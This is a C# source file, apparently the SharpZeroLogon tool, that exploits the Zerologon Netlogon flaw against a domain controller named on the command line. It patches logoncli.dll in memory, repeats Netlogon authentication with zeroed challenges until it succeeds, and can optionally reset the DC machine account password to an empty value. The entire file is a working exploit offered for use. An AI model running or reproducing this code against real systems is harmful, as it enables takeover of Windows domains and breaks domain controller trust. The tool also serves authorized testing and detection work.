using System;
using System.Diagnostics;
using static SharpZeroLogon.Netapi32;
using static SharpZeroLogon.Kernel32;
using System.Runtime.InteropServices;

namespace SharpZeroLogon
{
    class Program
    {
        static int FindPattern(byte[] buf, byte[] pattern)
        {
            int start = 0;
            int end = buf.Length - pattern.Length;
            byte firstByte = pattern[0];

            while (start <= end)
            {
                if (buf[start] == firstByte)
                {
                    for (int offset = 1; ; ++offset)
                    {
                        if (offset == pattern.Length)
                        {
                            return start;
                        }
                        else if (buf[start + offset] != pattern[offset])
                        {
                            break;
                        }
                    }
                }
                ++start;
            }
            return -1;
        }

        static bool PatchLogon()
        {
            // Patches logoncli.dll (x64) to use RPC over TCP/IP, making it work from non domain-joined
            // Credit to Benjamin Delpy @gentilkiwi for the neat trick!
            byte[] pattern = { 0xB8, 0x01, 0x00, 0x00, 0x00, 0x83, 0xF8, 0x01, 0x75, 0x3B };

            IntPtr hProc = Process.GetCurrentProcess().Handle;
            MODULEINFO modInfo = new MODULEINFO();
            IntPtr hModule = LoadLibrary("logoncli.dll");

            if (!GetModuleInformation(hProc, hModule, out modInfo, (uint)Marshal.SizeOf(modInfo)))
                return false;

            long addr = modInfo.lpBaseOfDll.ToInt64();
            long maxSize = addr + modInfo.SizeOfImage;

            while (addr < maxSize)
            {
                byte[] buf = new byte[1024];
                int bytesRead = 0;
                if (!ReadProcessMemory(hProc, addr, buf, 1024, ref bytesRead))
                    return false;

                int index = FindPattern(buf, pattern);
                if (index > -1)
                {
                    long patchAddr = addr + index + 1;
                    if (!VirtualProtect(new IntPtr(patchAddr), 1024, 0x04, out uint oldProtect))
                        return false;

                    // patch mov eax 1; => mov eax, 2;
                    Marshal.WriteByte(new IntPtr(patchAddr), 0x02);

                    if (!VirtualProtect(new IntPtr(patchAddr), 1024, oldProtect, out oldProtect))
                        return false;
                    return true;
                }
                addr += 1024;
            }
            return false;
        }

        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine(" Usage: SharpZeroLogon.exe <target dc fqdn> <optional: -reset -patch>");
                return;
            }

            bool reset = false;
            bool patch = false;
            string fqdn = args[0];
            string hostname = fqdn.Split('.')[0];

            foreach (string arg in args)
            {
                switch (arg)
                {
                    case "-reset":
                        reset = true;
                        break;
                    case "-patch":
                        patch = true;
                        break;
                }
            }

            if (patch)
            {
                if (!PatchLogon())
                {
                    Console.WriteLine("Patching failed :(");
                    return;
                }
                Console.WriteLine("Patch successful. Will use ncacn_ip_tcp");
            }

            NETLOGON_CREDENTIAL ClientChallenge = new NETLOGON_CREDENTIAL();
            NETLOGON_CREDENTIAL ServerChallenge = new NETLOGON_CREDENTIAL();
            ulong NegotiateFlags = 0x212fffff;

            Console.WriteLine("Performing authentication attempts...");

            for (int i = 0; i < 2000; i++)
            {
                if (I_NetServerReqChallenge(fqdn, hostname, ref ClientChallenge, ref ServerChallenge) != 0)
                {
                    Console.WriteLine("Unable to complete server challenge. Possible invalid name or network issues?");
                    return;
                }
                Console.Write("=");

                if (I_NetServerAuthenticate2(fqdn, hostname + "$", NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
                    hostname, ref ClientChallenge, ref ServerChallenge, ref NegotiateFlags) == 0)
                {
                    Console.WriteLine("\nSuccess! DC can be fully compromised by a Zerologon attack.");

                    NETLOGON_AUTHENTICATOR authenticator = new NETLOGON_AUTHENTICATOR();
                    NL_TRUST_PASSWORD ClearNewPassword = new NL_TRUST_PASSWORD();

                    if (reset)
                    {
                        if (I_NetServerPasswordSet2(
                            fqdn,
                            hostname + "$",
                            NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
                            hostname,
                            ref authenticator,
                            out _,
                            ref ClearNewPassword
                            ) == 0)
                        {
                            Console.WriteLine("Done! Machine account password set to NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0");
                            return;
                        }
                        Console.WriteLine("Failed to reset machine account password");
                    }

                    return;
                }
            }
            Console.WriteLine("\nAttack failed. Target is probably patched.");
        }
    }
}